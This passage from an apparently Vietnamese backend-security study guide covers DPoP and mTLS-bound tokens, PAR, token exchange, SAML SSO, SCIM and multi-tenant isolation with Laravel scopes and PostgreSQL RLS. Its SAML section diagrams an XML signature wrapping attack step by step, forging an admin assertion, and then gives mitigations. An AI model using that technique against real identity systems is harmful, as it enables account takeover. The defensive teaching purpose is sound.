đã xảy ra thật: lỗ hổng ở tầng khác trong stack như CRIME, BREACH, Heartbleed, lỗi parser của
Cloudflare (Cloudbleed), và các vụ trộm token trên chính các implementation OAuth; RFC cũng bàn
riêng trường hợp XSS lấy token trong client chạy trên trình duyệt. Ngoài ra token còn hay lọt qua
log và proxy.

Vì sao **HTTPS + token ngắn hạn** chưa đủ (câu hay bị hỏi):

- HTTPS chỉ bảo vệ token *trên đường truyền*. Token vẫn lọt ở hai đầu: log của proxy hay app, bộ
  nhớ trình duyệt bị XSS đọc, một resource server độc hại hoặc bị chiếm đem token nó nhận được đi
  dùng ở resource server khác.
- Token ngắn hạn chỉ **thu hẹp cửa sổ**, không đóng cửa. Năm phút là đủ cho một script rút tiền.
  Refresh token bị lấy thì cửa sổ thành vô hạn.
- Giới hạn `aud` (audience) chặn được việc dùng token ở server khác, nhưng RFC 9449 nhận xét với
  nhiều hệ thống, làm việc này trong thực tế cồng kềnh tới mức không khả thi.

*Sender-constrained token*: token gắn với một bí mật mà chỉ client hợp lệ có (private key), và
người nhận token bắt client chứng minh đang giữ bí mật đó. Kẻ trộm token mà không có private key
thì token vô dụng. RFC 9700 mục 2.2.1: authorization server và resource server **SHOULD** dùng
sender-constrained access token (mTLS theo RFC 8705 hoặc DPoP theo RFC 9449); mục 2.2.2: refresh
token của *public client* (client không có secret, như SPA, mobile) **MUST** được sender-constrain
hoặc dùng *refresh token rotation*.

*DPoP* (Demonstrating Proof of Possession, RFC 9449) làm ở tầng ứng dụng:

```
Client (giữ cặp key tự sinh)                  Authorization Server        Resource Server
   |                                                   |                         |
   |-- (A) POST /token + header DPoP: proof ---------->|                         |
   |       (proof ký bằng private key, chứa public key)|                         |
   |<- (B) access_token, token_type=DPoP --------------|                         |
   |       (token gắn thumbprint public key: cnf.jkt)  |                         |
   |                                                                             |
   |-- (C) GET /accounts                                                         |
   |       Authorization: DPoP <access_token>                                    |
   |       DPoP: <proof mới cho đúng request này, có ath = hash(access_token)> ->|
   |<- (D) dữ liệu, nếu proof hợp lệ và key khớp thumbprint trong token ---------|
```

1. Client tự sinh một cặp key bất đối xứng (trình duyệt có thể tạo key *non-extractable* qua WebCrypto,
   tức JavaScript dùng được key để ký nhưng không đọc được private key ra).
2. Mỗi request (kể cả request lấy token), client tạo một *DPoP proof*: một JWT ký bằng private key,
   gửi qua header `DPoP`. Header JWT có `typ: dpop+jwt`, `alg` là thuật toán chữ ký **bất đối xứng**
   (cấm `none` và cấm thuật toán MAC), `jwk` là public key. Payload có:
   - `jti`: id duy nhất của proof (dùng chống replay).
   - `htm`, `htu`: method và URI của đúng request này (URI bỏ query và fragment).
   - `iat`: thời điểm tạo.
   - `ath`: base64url của SHA-256 access token, bắt buộc khi gọi resource server.
   - `nonce`: khi server đã cấp nonce qua header `DPoP-Nonce`.
3. Authorization server kiểm proof, gắn access token với public key: token dạng JWT chứa claim
   `cnf: {"jkt": "<JWK SHA-256 thumbprint>"}` (thumbprint theo RFC 7638), hoặc trả thông tin này qua
   token introspection. Response có `token_type: DPoP`. Refresh token cấp cho public client cũng bị
   gắn với key đó.
4. Resource server nhận `Authorization: DPoP <token>` (scheme `DPoP`, không phải `Bearer`) và kiểm:
   có đúng một header `DPoP`, là JWT hợp lệ, `typ` đúng, `alg` bất đối xứng được chấp nhận, chữ ký
   verify bằng `jwk` trong proof, `jwk` không chứa private key, `htm`/`htu` khớp request, `nonce`
   khớp nếu có, `iat` trong cửa sổ cho phép, `ath` bằng hash của token, và **thumbprint của `jwk`
   bằng `cnf.jkt` trong token**. Thiếu một điều kiện là từ chối.

Ví dụ nội dung một proof (đã giải mã, rút gọn giá trị key; minh hoạ theo cấu trúc trong RFC 9449,
không phải token thật):

```json
{ "typ": "dpop+jwt", "alg": "ES256",
  "jwk": { "kty": "EC", "crv": "P-256", "x": "l8tF...", "y": "9VE4..." } }
.
{ "jti": "e1j3V_bKic8-LAEB", "htm": "GET",
  "htu": "https://resource.example.org/protectedresource",
  "iat": 1562262618, "ath": "fUHyO2r2Z3DZ53EsNrWBb0xWXoaNy59IiKCAqksmQEo" }
```

Hai phép kiểm có thể tự viết mà không cần thư viện JWT (verify chữ ký thì dùng thư viện đã kiểm
chứng):

```php
<?php
declare(strict_types=1);

function base64url(string $bin): string
{
    return rtrim(strtr(base64_encode($bin), '+/', '-_'), '=');
}

// ath: base64url(SHA-256(access token dạng ASCII)), RFC 9449 mục 4.2
function expectedAth(string $accessToken): string
{
    return base64url(hash('sha256', $accessToken, true));
}

/** @param array<string, mixed> $proofPayload đã verify chữ ký bằng thư viện JWT */
function checkProofBinding(array $proofPayload, string $accessToken, string $method, string $uri): bool
{
    $htuWithoutQuery = strtok($uri, '?#');
    return hash_equals(expectedAth($accessToken), (string) ($proofPayload['ath'] ?? ''))
        && ($proofPayload['htm'] ?? null) === $method
        && ($proofPayload['htu'] ?? null) === $htuWithoutQuery
        && abs(time() - (int) ($proofPayload['iat'] ?? 0)) <= 60;   // cửa sổ ngắn, tự chọn
}
// Còn thiếu: so thumbprint của jwk với cnf.jkt, và lưu jti để chặn dùng lại proof.
```

*Chống replay proof* (RFC 9449 mục 11.1): proof bị bắt được vẫn dùng lại được cho **cùng** method
và URI. Vì vậy server chỉ nhận proof trong thời gian ngắn sau khi tạo (cỡ giây hoặc phút), có thể
lưu `jti` trong cửa sổ đó để từ chối proof trùng (khó khi nhiều server không chia sẻ trạng thái),
và có thể bắt client dùng nonce do server cấp (header `DPoP-Nonce`), vừa chống proof tạo sẵn cho
tương lai vừa né lệch đồng hồ.

DPoP **không** chặn được (RFC 9449 nói rõ):

- XSS chạy ngay trong trang: code độc dùng luôn key (dù non-extractable) để ký proof và gọi API qua
  chính client. Chỉ chặn được bằng cách hết XSS. DPoP chặn được việc **mang token đi dùng chỗ khác**.
- DPoP không thay HTTPS (bắt buộc dùng cùng HTTPS), không phải cơ chế xác thực client, và một proof
  hợp lệ một mình không đủ để quyết định quyền truy cập.

*mTLS-bound token* (RFC 8705 mục 3) làm ở tầng TLS:

1. Client kết nối tới token endpoint bằng *mutual TLS* (cả hai bên trình certificate).
2. Authorization server gắn access token với certificate của client: JWT chứa
   `cnf: {"x5t#S256": "<base64url SHA-256 của certificate dạng DER>"}`, hoặc trả qua introspection.
3. Client gọi resource server qua mTLS **bằng đúng certificate đó**. Resource server lấy
   certificate từ tầng TLS, so với thumbprint trong token; không khớp thì trả 401 `invalid_token`.

- mTLS dùng để xác thực client (mục 2 của RFC) và mTLS để gắn token (mục 3) là hai việc độc lập.
  Public client vẫn gắn token được bằng certificate tự ký (mục 4).
- Resource server phải **biết trước** là cần mTLS, vì certificate được xin trong lúc handshake, trước
  khi thấy access token. Thực tế hay tách host hoặc port riêng cho API cần mTLS.
- ⚠️ TLS kết thúc ở load balancer thì app không thấy certificate. RFC 8705 để việc chuyển thông tin
  certificate từ proxy vào app ngoài phạm vi, nên đây là chỗ tự thiết kế: proxy chuyển certificate
  qua header (ví dụ Nginx có biến `$ssl_client_escaped_cert`), và **phải xoá header cùng tên do
  client gửi lên**, nếu không kẻ tấn công tự điền certificate giả vào header.

| | DPoP | mTLS-bound token |
|---|---|---|
| Gắn token với | Cặp key client tự sinh, không cần PKI | Certificate TLS của client |
| Kiểm tra ở | Tầng ứng dụng: header `DPoP`, scheme `Authorization: DPoP` | Tầng TLS, trong handshake |
| Claim trong token | `cnf.jkt` | `cnf.x5t#S256` |
| Hợp với | SPA (mTLS trên trình duyệt trải nghiệm rất tệ), mobile | Server-to-server, open banking, nơi đã có PKI |
| Cái giá | Ký thêm mỗi request; lưu `jti`/cấp nonce để chống replay; mọi resource server phải tự kiểm | Cấp phát, xoay vòng certificate; cấu hình TLS; chuyển cert qua load balancer an toàn |

Chọn nhanh: backend của đối tác ngân hàng gọi API thanh toán của bạn, hai bên đã trao đổi
certificate: mTLS. App mobile hay SPA của bạn muốn token trộm được là vô dụng: DPoP (key lưu trong
Keychain/Keystore hoặc WebCrypto non-extractable).

#### PAR và token exchange

Trong OAuth thường, mọi tham số authorization request (`client_id`, `redirect_uri`, `scope`,
`state`, `code_challenge`...) nằm trên URL trình duyệt. RFC 9126 nêu ba vấn đề: không có bảo vệ
toàn vẹn (kẻ tấn công sửa `scope` hay ngữ cảnh giao dịch thanh toán), không bí mật (query string
lọt vào log, header Referer, mà có thể chứa dữ liệu cá nhân), và URL quá dài khi yêu cầu quyền chi
tiết.

*PAR* (Pushed Authorization Requests, RFC 9126):

1. Client `POST` toàn bộ tham số tới *PAR endpoint* của authorization server qua back-channel
   (server gọi server), **kèm xác thực client** như ở token endpoint.
2. Authorization server xác thực client, kiểm `redirect_uri`, `scope` ngay lúc này, rồi trả
   `201 Created` với `request_uri` và `expires_in`. `request_uri` dùng **một lần**, phải chứa phần
   ngẫu nhiên không đoán được; RFC cho ví dụ `expires_in: 90` và nói thời hạn thường ngắn, khoảng
   5 tới 600 giây.
3. Client chuyển trình duyệt tới `/authorize?client_id=...&request_uri=...`. Trên URL không còn
   tham số nào để sửa.

```
POST /as/par                          (back-channel, có client authentication)
  response_type=code&client_id=s6BhdRkqt3&redirect_uri=...&scope=account-information
  &code_challenge=...&code_challenge_method=S256
-> 201 {"request_uri": "urn:example:bwc4JK-ESC0w8acc191e-Y1LTC2", "expires_in": 90}

GET /authorize?client_id=s6BhdRkqt3&request_uri=urn%3Aexample%3Abwc4JK-ESC0w8acc191e-Y1LTC2
```

- Lợi ích: tham số được bảo vệ toàn vẹn và bí mật, URL ngắn, và authorization server từ chối request
  giả mạo **trước khi** user phải tương tác.
- Metadata: server quảng bá `pushed_authorization_request_endpoint`; đặt
  `require_pushed_authorization_requests: true` để chỉ nhận authorization request qua PAR.
- Dùng cùng DPoP: gửi `dpop_jkt` (thumbprint key) trong PAR, hoặc gắn header `DPoP` vào chính request
  PAR, để gắn authorization code với key của client ngay từ đầu (RFC 9449 mục 10.1).
- *FAPI 2.0* (bộ quy chuẩn bảo mật OAuth của OpenID Foundation cho tài chính, open banking) bắt buộc
  PAR, PKCE và sender-constrained token (mTLS hoặc DPoP).

*Token exchange* (RFC 8693): service A nhận token của user, cần gọi service B thay mặt user. Chuyển
tiếp nguyên token của user là tệ: token đó có `aud` và scope rộng, B bị chiếm thì token dùng được ở
mọi nơi token gốc dùng được. Thay vào đó A đổi token tại authorization server:

```
POST /as/token.oauth2
Authorization: Basic <client credentials của service A>
grant_type=urn:ietf:params:oauth:grant-type:token-exchange
&resource=https://backend.example.com/api
&subject_token=<access token của user>
&subject_token_type=urn:ietf:params:oauth:token-type:access_token

-> {"access_token": "...", "issued_token_type": "urn:ietf:params:oauth:token-type:access_token",
    "token_type": "Bearer", "expires_in": 60}
```

- Tham số chính: `subject_token` (danh tính người được đại diện), `actor_token` (tuỳ chọn, danh tính
  bên hành động), `resource`/`audience` (nơi token mới sẽ dùng), `scope`, `requested_token_type`.
- Token mới hẹp hơn: `aud` chỉ là B, scope nhỏ hơn, sống ngắn (ví dụ trong RFC là 60 giây).
- RFC phân biệt *impersonation* (A được coi **là** user trong phạm vi token) và *delegation* (A vẫn
  là A, hành động **thay mặt** user; JWT có claim `act` ghi chuỗi ai đang đại diện ai). Delegation
  cho log kiểm toán rõ hơn.

#### SSO và SAML

*SSO* (Single Sign-On): user đăng nhập một lần ở *IdP* (Identity Provider, ví dụ Okta, Microsoft
Entra ID, Google Workspace), nhiều *SP* (Service Provider, tức các app) tin kết quả xác thực của
IdP. Khách doanh nghiệp đòi SSO để kiểm soát tập trung: bật MFA một chỗ, khoá nhân viên nghỉ việc
một chỗ.

| | SAML 2.0 | OIDC |
|---|---|---|
| Định dạng | XML, chữ ký XML (XML Signature) | JSON, JWT |
| Kết quả xác thực | *Assertion* đã ký | ID token đã ký |
| Truyền qua | Trình duyệt (redirect, auto-submit form POST) | Redirect + back-channel đổi code lấy token |
| Phổ biến ở | Doanh nghiệp, intranet, app B2B | Consumer, mobile, app hiện đại |
| Độ khó làm đúng | Cao (XML canonicalization, nhiều quy tắc xử lý) | Thấp hơn |

Luồng *SP-initiated* (bắt đầu từ app, cách nên dùng):

```
Trình duyệt           SP (app của bạn)                       IdP (Okta, Entra ID)
    |-- GET /dashboard ---->|                                       |
    |<-- redirect + AuthnRequest(ID=abc) ---------------------------|
    |------------------------------------------------ user đăng nhập, MFA ->|
    |<-- HTML form tự submit: SAMLResponse (Assertion đã ký, InResponseTo=abc)
    |-- POST /saml/acs (Assertion Consumer Service) ->|
    |                       | kiểm chữ ký + mọi điều kiện, tạo session app
```

SP phải kiểm (OWASP SAML Security Cheat Sheet):

- Chữ ký hợp lệ, bằng **public key của IdP lấy trước qua kênh tin cậy** (metadata URL qua TLS), bỏ
  qua key nhúng trong phần `KeyInfo` của tài liệu.
- Assertion (hoặc cả Response) được ký, và `<ds:Reference URI>` của chữ ký **trỏ đúng vào Assertion
  mà code đang đọc**.
- `Destination` khớp đúng URL ACS của mình; `Audience` khớp EntityID của mình (chống lấy assertion
  cấp cho SP khác đem sang).
- `NotBefore`/`NotOnOrAfter` còn hạn; `InResponseTo` khớp ID của AuthnRequest mình đã gửi; `Recipient`
  đúng.
- Từ chối thuật toán dựa trên SHA-1; phát hiện replay (assertion dùng một lần, thời hạn ngắn).
- ⚠️ *IdP-initiated SSO* (user bấm từ portal IdP, không có AuthnRequest) kém an toàn hơn vì SP không
  có cách kiểm user thật sự chủ động đăng nhập (không chống được *login CSRF*). Bắt buộc bật thì
  thêm chống replay và kiểm `RelayState` là URL nằm trong allowlist (tránh open redirect).

⚠️ *XML signature wrapping* (XSW; mô tả trong bài "On Breaking SAML: Be Whoever You Want to Be",
USENIX Security 2012). Gốc rễ: code **kiểm chữ ký** và code **đọc dữ liệu** nhìn vào hai phần tử
khác nhau của cùng một tài liệu XML.

```
Response gốc từ IdP                    Response sau khi kẻ tấn công sửa
<Response>                             <Response>
  <Assertion ID="a1">  <---+             <Assertion ID="evil">        <- không được ký
    <Subject>bob@x</Subject> |             <Subject>admin@x</Subject>     code đọc email ở đây
  </Assertion>             |             </Assertion>
  <Signature>              |             <Signature>
    <Reference URI="#a1"> -+               <Reference URI="#a1"> ----+
  </Signature>                             <Object>                   |
</Response>                                  <Assertion ID="a1"> <----+ bản gốc bị dời vào đây,
                                               <Subject>bob@x</Subject>  chữ ký vẫn hợp lệ
                                             </Assertion>
                                           </Object>
                                         </Signature>
                                       </Response>
```

1. Kẻ tấn công lấy một Response hợp lệ của chính họ (tài khoản `bob`).
2. Dời Assertion gốc đã ký vào một chỗ khác (ví dụ trong `Object`), giữ nguyên `ID="a1"`.
3. Chèn một Assertion giả không ký với `Subject` là `admin` vào vị trí code thường đọc.
4. Bộ verify tìm phần tử theo `URI="#a1"`, thấy chữ ký đúng, báo hợp lệ.
5. Code nghiệp vụ lấy Assertion **đầu tiên** (ví dụ `getElementsByTagName('Assertion')->item(0)`)
   và đọc `admin@x`. Kẻ tấn công đăng nhập thành admin.

Chặn: dùng thư viện SAML đã kiểm chứng và cập nhật bản vá, không tự parse XML; validate schema bằng
bản schema cục bộ (không tải schema từ ngoài) trước khi dùng; chỉ đọc dữ liệu từ **đúng phần tử mà
bộ verify đã xác nhận**; không chọn phần tử bảo mật bằng `getElementsByTagName`, dùng XPath tuyệt
đối. Parser XML còn phải tắt external entity ([2.6](#26-lỗ-hổng-web-và-api-theo-owasp), XXE).

*SCIM* (System for Cross-domain Identity Management, RFC 7643 cho schema và RFC 7644 cho giao thức):
API REST chuẩn (`/Users`, `/Groups`) để IdP **đẩy** thay đổi sang app: tạo user, cập nhật, khoá
(`active: false`), xoá. Vì sao cần: SAML và OIDC chỉ chạy **lúc đăng nhập**. Không có SCIM, nhân
viên nghỉ việc bị khoá ở IdP nhưng tài khoản trong app vẫn còn, session đang mở vẫn sống, API token
đã tạo vẫn dùng được. Với SCIM, app nhận lệnh khoá và phải tự thu hồi session, token của user đó.
Cách thay thế đơn giản hơn là *JIT provisioning* (tạo user lúc đăng nhập SSO lần đầu), nhưng JIT
không khoá được ai.

#### Session ở hai tầng

```
           IdP session (cookie ở domain IdP)
                 |           |
      app A session       app B session      <- mỗi app một session riêng, cookie riêng
```

- Session ở IdP và session ở từng app sống độc lập. Logout ở app A chỉ xoá session của A; bấm "đăng
  nhập bằng SSO" lần nữa là vào lại ngay mà không hỏi password, vì session IdP còn. Ngược lại, logout
  ở IdP (hay admin khoá user) không tự xoá session của A và B.
- OIDC có ba cơ chế bổ sung:
  - *RP-Initiated Logout*: app chuyển user tới `end_session_endpoint` của IdP để logout cả ở IdP.
  - *Front-Channel Logout*: IdP nhúng iframe tới URL logout của từng app qua trình duyệt. Phụ thuộc
    vào cookie của app gửi được trong iframe, nên dễ hỏng khi trình duyệt chặn cookie bên thứ ba.
  - *Back-Channel Logout*: IdP gọi thẳng server của app, không qua trình duyệt.
- Back-Channel Logout chi tiết: IdP `POST` tới `backchannel_logout_uri` đã đăng ký của app, body có
  `logout_token` là một JWT đã ký. Token có `iss`, `aud`, `iat`, `exp`, `jti`, claim `events` chứa
  khoá `http://schemas.openid.net/event/backchannel-logout`, và có `sub` hoặc `sid` (hoặc cả hai);
  **cấm** có `nonce` (để không thể dùng logout token thay ID token). App validate như ID token, xoá
  mọi session khớp `sid` (hoặc mọi session của `sub` nếu không có `sid`), trả 200.
- Hệ quả thiết kế: app phải tìm được session **theo `sid`/`sub` mà không có cookie của user**. Với
  Laravel, nghĩa là session lưu phía server (driver `database` hoặc `redis`) và một bảng ánh xạ
  `sid` của IdP sang session id của app; session driver `cookie` thì không xoá từ xa được. Spec cũng
  nhắc: URL back-channel phải truy cập được từ IdP (không nằm sau firewall khi dùng IdP công cộng),
  và refresh token cấp không kèm `offline_access` cho session bị logout nên bị thu hồi.
- SAML có cơ chế tương đương gọi là *Single Logout* (SLO). Dù dùng gì, kết hợp với SCIM (khoá user)
  và access token ngắn hạn để việc khoá có hiệu lực nhanh.

**Tóm tắt nhanh**
- Bearer token lọt ở hai đầu (log, XSS, resource server độc hại), HTTPS không che, TTL ngắn chỉ thu
  hẹp cửa sổ. RFC 9700: nên dùng sender-constrained token; refresh token của public client phải
  sender-constrained hoặc rotation.
- DPoP: mỗi request một proof JWT ký bằng key client (`htm`, `htu`, `iat`, `jti`, `ath`), token
  mang `cnf.jkt`; chống mang token đi nơi khác, không chống XSS đang chạy trong trang.
- mTLS: token mang `cnf.x5t#S256`, kiểm ở tầng TLS; hợp server-to-server; cẩn thận khi TLS kết thúc
  ở load balancer.
- PAR đưa tham số authorization lên back-channel, URL chỉ còn `request_uri` dùng một lần; FAPI 2.0
  bắt buộc. Token exchange đổi token rộng lấy token hẹp cho service kế tiếp.
- SAML: XSW xảy ra khi phần được verify khác phần được đọc; dùng thư viện, kiểm Destination,
  Audience, InResponseTo, thời hạn. SCIM để khoá user; back-channel logout để giết session app.

**Nguồn**: [RFC 9449: DPoP](https://www.rfc-editor.org/rfc/rfc9449) (mục 1 tới 7, 10, 11.1) ·
[RFC 8705: OAuth 2.0 Mutual-TLS](https://www.rfc-editor.org/rfc/rfc8705) (mục 2 tới 4, 6.5) ·
[RFC 9126: PAR](https://www.rfc-editor.org/rfc/rfc9126) ·
[RFC 9700: mục 2.2 Token Replay Prevention](https://www.rfc-editor.org/rfc/rfc9700#section-2.2) ·
[RFC 8693: Token Exchange](https://www.rfc-editor.org/rfc/rfc8693) ·
[OWASP: SAML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html) ·
[OWASP: Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) (mục SAML, OIDC) ·
[OpenID Connect Back-Channel Logout 1.0](https://openid.net/specs/openid-connect-backchannel-1_0.html)

---

### 3.2 Multi-tenant isolation

Module này trả lời: khi nhiều công ty khách hàng dùng chung một hệ thống, chọn mức cô lập nào cho
từng phần, và làm sao để không có đường nào (query, cache, file, job, search) đọc được dữ liệu của
tenant khác, kể cả khi lập trình viên quên.

#### Ba mức cô lập

*Tenant* là một khách hàng (thường là một công ty) trong hệ thống dùng chung; mỗi tenant có nhiều
user. *Multi-tenant* nghĩa là một bản triển khai phục vụ nhiều tenant. Whitepaper của AWS đặt tên cho
các mô hình như sau:

- *Silo*: mỗi tenant một bộ tài nguyên riêng (DB riêng, có khi cả compute, VPC hay tài khoản cloud
  riêng). Ranh giới cô lập là ranh giới hạ tầng, dễ mô tả và dễ chứng minh với khách.
- *Pool*: mọi tenant dùng chung tài nguyên, dữ liệu phân biệt bằng định danh tenant. Cô lập lúc
  này là cô lập *logic*, do policy áp lúc chạy.
- *Bridge*: trộn hai kiểu theo từng tầng hoặc từng service, ví dụ web tier chung nhưng tầng lưu trữ
  tách riêng từng tenant.
- *Tier-based*: đóng gói mức cô lập thành gói bán. Gói thường chạy pool, gói cao cấp (giá cao hơn
  nhiều) chạy silo. Theo AWS, nhà cung cấp SaaS thường yêu cầu bản silo chạy **cùng phiên bản** code
  với pool, để vẫn vận hành mọi thứ từ một chỗ.

Với tầng database, ba mức hay gặp:

| Mức | Mô tả | Chi phí, vận hành | Rủi ro lộ chéo | Ghi chú |
|---|---|---|---|---|
| DB riêng (silo) | Mỗi tenant một database | Cao nhất: migration chạy N lần, nhiều connection | Thấp nhất | Dễ backup, restore, xoá riêng một tenant; hợp khách bị ràng buộc compliance |
| Schema riêng | Chung server DB, mỗi tenant một schema | Trung bình | Trung bình | Ở MySQL, "schema" chính là database, nên thực chất là "nhiều DB trên một server" |
| Chung bảng (pool) | Mọi tenant chung bảng, phân biệt bằng cột `tenant_id` | Rẻ nhất, một lần migration | Cao nhất | Một `WHERE` bị quên là lộ dữ liệu |

Silo ưu điểm: không có *noisy neighbor* (xem dưới), dễ tính chi phí từng tenant, *blast radius*
(phạm vi ảnh hưởng khi sự cố) nhỏ. Nhược: tốn tiền vì tài nguyên chờ rỗi, onboarding tenant mới phải
dựng hạ tầng, giám sát phân tán. Pool thì ngược lại: rẻ, triển khai một lần cho tất cả, nhưng chung
số phận khi sự cố và khó tính chi phí theo tenant.

Mấy nguyên tắc AWS nêu đáng nhắc lại khi phỏng vấn:

- Authentication và authorization **không** bằng cô lập. Qua được màn hình login chưa có nghĩa là
  bị giới hạn trong tenant của mình.
- Cô lập không được phó mặc cho từng lập trình viên nhớ thêm `WHERE`. Phải có một cơ chế chung, áp
  tự động, nằm ngoài tầm tay code nghiệp vụ.
- Pool khó cô lập hơn không phải là lý do để hạ yêu cầu cô lập.
- RBAC (role của user trong app) khác với tenant isolation: RBAC quyết định user làm được chức năng
  gì; isolation quyết định tenant này có chạm được dữ liệu tenant kia không.

Ví dụ lập luận cho câu "SaaS B2B 500 tenant, trong đó 3 tenant rất lớn":

1. 497 tenant nhỏ vào pool (chung bảng có `tenant_id`), vì silo cho 500 tenant là 500 lần migration
   và 500 bộ connection.
2. 3 tenant lớn vào silo DB riêng (tier-based): tránh việc một tenant chiếm phần lớn tải làm chậm
   496 tenant còn lại, và thường chính họ đòi cách ly vì compliance.
3. Cùng một codebase, cùng một phiên bản. App tra một *directory* `tenant_id → connection` để chọn DB.
   Nhờ mọi bảng đều có `tenant_id` ngay từ đầu, việc chuyển một tenant từ pool sang silo là copy dữ
   liệu theo `tenant_id`, không phải sửa code. Chi tiết về *whale tenant* và directory ở
   [03-database-sql.md#36-scale-partitioning-sharding-archiving](03-database-sql.md#36-scale-partitioning-sharding-archiving).

#### Chung bảng làm sao cho an toàn

Nguyên tắc 1: `tenant_id` lấy từ danh tính đã xác thực (session, claim trong token), **không** lấy
từ tham số request (`?tenant_id=5`, header `X-Tenant-Id` do client gửi). Nếu một user thuộc nhiều
tenant và được chọn tenant, server phải kiểm tra user thật sự là thành viên của tenant đã chọn. Đây
là biến thể của IDOR ở module 1.5, chỉ khác là "object" bị đoán là cả một công ty.

Nguyên tắc 2: đặt bộ lọc ở một chỗ duy nhất. Trong Laravel đó là *global scope*: một class
implement `Illuminate\Database\Eloquent\Scope`, method `apply()` thêm điều kiện vào **mọi** query
Eloquent của model. Cách viết `TenantScope` và gắn bằng `#[ScopedBy]` hay `addGlobalScope()` đã có ở
[05-php-laravel.md#25-eloquent-ở-mức-làm-chủ](05-php-laravel.md#25-eloquent-ở-mức-làm-chủ). Phần ở
đây là những gì global scope **không** che:

```php
<?php
declare(strict_types=1);

namespace App\Models\Concerns;

use App\Models\Scopes\TenantScope;
use App\Support\CurrentTenant;
use Illuminate\Database\Eloquent\Model;

// Trait gắn cho mọi model thuộc về tenant
trait BelongsToTenant
{
    protected static function bootBelongsToTenant(): void
    {
        // Đọc (và update/delete qua Eloquent builder) được lọc tự động
        static::addGlobalScope(new TenantScope());

        // Global scope KHÔNG áp cho INSERT: tự điền tenant_id khi tạo bản ghi,
        // để không ai phải nhớ, và không cho client gửi tenant_id qua mass assignment
        static::creating(function (Model $model): void {
            $model->setAttribute('tenant_id', app(CurrentTenant::class)->id());
        });
    }
}
```

`CurrentTenant` ở đây là một class tự viết (không phải của Laravel), giữ tenant của request hiện
tại; nó phải **ném exception khi chưa có tenant** thay vì trả `null`. Nếu trả `null`, scope sinh ra
`WHERE tenant_id IS NULL` hoặc bị bỏ qua tuỳ cách viết, và lỗi âm thầm là loại lỗi nguy hiểm nhất.

⚠️ Những đường đi vòng qua global scope:

| Đường vòng | Vì sao lọt | Cách chặn |
|---|---|---|
| `Invoice::withoutGlobalScopes()`, `withoutGlobalScope(TenantScope::class)` | Chủ động bỏ scope | Chỉ cho phép ở code admin; grep trong CI hoặc rule PHPStan tự viết |
| `DB::table('invoices')`, `DB::select('...')` | Query builder và raw SQL không đi qua Eloquent model | Tự thêm `where('tenant_id', ...)`, hạn chế dùng cho bảng của tenant |
| `join('invoices', ...)` từ query của model khác | Scope chỉ gắn vào model gốc của query | Thêm điều kiện tenant vào `ON` |
| Rule validation `exists:projects,id` | Rule chạy bằng query builder, không có scope. User tenant A gửi `project_id` của tenant B và vẫn qua validation | `Rule::exists('projects', 'id')->where('tenant_id', $tenantId)` |
| Command, scheduler, tinker | Không có request, không có user | Bắt buộc chọn tenant tường minh; chạy cho mọi tenant thì lặp từng tenant |

Nguyên tắc 3: thêm một lớp ở DB để lỗi của app không thành lộ dữ liệu (*defense in depth*: nhiều
lớp phòng thủ độc lập, lớp này hỏng còn lớp kia).

PostgreSQL có *Row-Level Security* (RLS): bảng có thể gắn *policy*, là biểu thức boolean được DB
tự áp cho từng dòng **trước** mọi điều kiện của câu query. Những điểm chính theo tài liệu Postgres:

1. Bật bằng `ALTER TABLE ... ENABLE ROW LEVEL SECURITY`. Đã bật mà chưa có policy nào thì mặc định là
   *default deny*: không thấy dòng nào, không sửa được dòng nào.
2. `USING (...)` lọc các dòng đã có (SELECT, UPDATE, DELETE thấy dòng nào). `WITH CHECK (...)` kiểm
   tra dòng mới ghi (INSERT, UPDATE). Policy không ghi `WITH CHECK` thì dùng luôn biểu thức `USING`.
3. Nhiều policy *permissive* (mặc định) ghép với nhau bằng OR; policy `AS RESTRICTIVE` ghép bằng AND.
4. Superuser và role có thuộc tính `BYPASSRLS` luôn bỏ qua RLS. Chủ bảng (*table owner*) thường cũng
   bỏ qua, trừ khi `ALTER TABLE ... FORCE ROW LEVEL SECURITY`.
5. Kiểm tra ràng buộc toàn vẹn (unique, primary key, foreign key) luôn bỏ qua RLS, nên có thể thành
   kênh rò rỉ gián tiếp: thử insert một giá trị unique và nhìn lỗi là biết tenant khác có giá trị đó.

```sql
-- PostgreSQL 18
CREATE TABLE invoices (
  id        bigserial PRIMARY KEY,
  tenant_id bigint NOT NULL,
  total     numeric(12,2) NOT NULL
);
ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;
ALTER TABLE invoices FORCE ROW LEVEL SECURITY;   -- áp cả khi app kết nối bằng role chủ bảng

-- app.tenant_id là biến cấu hình tự đặt tên, app set cho mỗi transaction
CREATE POLICY tenant_isolation ON invoices
  USING (tenant_id = current_setting('app.tenant_id')::bigint);

-- Trong app, đầu mỗi transaction:
BEGIN;
SELECT set_config('app.tenant_id', '5', true);   -- true: chỉ có hiệu lực trong transaction này
SELECT * FROM invoices;                           -- chỉ thấy dòng tenant 5, dù không có WHERE
INSERT INTO invoices (tenant_id, total) VALUES (6, 10);  -- lỗi: vi phạm policy (WITH CHECK ngầm)
COMMIT;
```

- Quên set `app.tenant_id` thì `current_setting` báo lỗi (hoặc, trên connection từng set tham số này
  bằng `true`, trả chuỗi rỗng và phép ép `::bigint` báo lỗi), query hỏng, tức là *fail closed* (hỏng
  theo hướng từ chối), tốt hơn nhiều so với trả dữ liệu của mọi tenant.
- ⚠️ App phải kết nối bằng role **không** phải superuser và không có `BYPASSRLS`. Migration và job
  admin dùng role khác.
- ⚠️ Dùng tham số thứ ba `true` (tương đương `SET LOCAL`) để giá trị hết hạn khi transaction kết
  thúc. Set ở mức session trên connection được tái sử dụng (persistent connection, Octane, connection
  pooler) thì request sau có thể thừa hưởng tenant của request trước.
- Policy nên chỉ so cột của chính dòng đó. Tài liệu Postgres cảnh báo policy có sub-SELECT sang bảng
  khác có thể gặp race condition làm lộ dữ liệu.
- Khi backup, đặt `row_security = off`: tham số này không bỏ qua RLS mà làm query **báo lỗi** nếu kết
  quả bị policy lọc, để backup không âm thầm thiếu dòng.

MySQL 8.4 không có RLS. Có thể dùng view, nhưng view MySQL không được tham chiếu biến hệ thống hay
biến người dùng, nên không truyền `tenant_id` qua biến session được; muốn lọc theo `CURRENT_USER()`
thì phải có một tài khoản DB cho mỗi tenant, nặng nề và ít ai làm. Thực tế với MySQL, lớp bảo vệ
chính là tầng app (scope, trait, review) cộng test tự động.

#### Những chỗ hay lộ

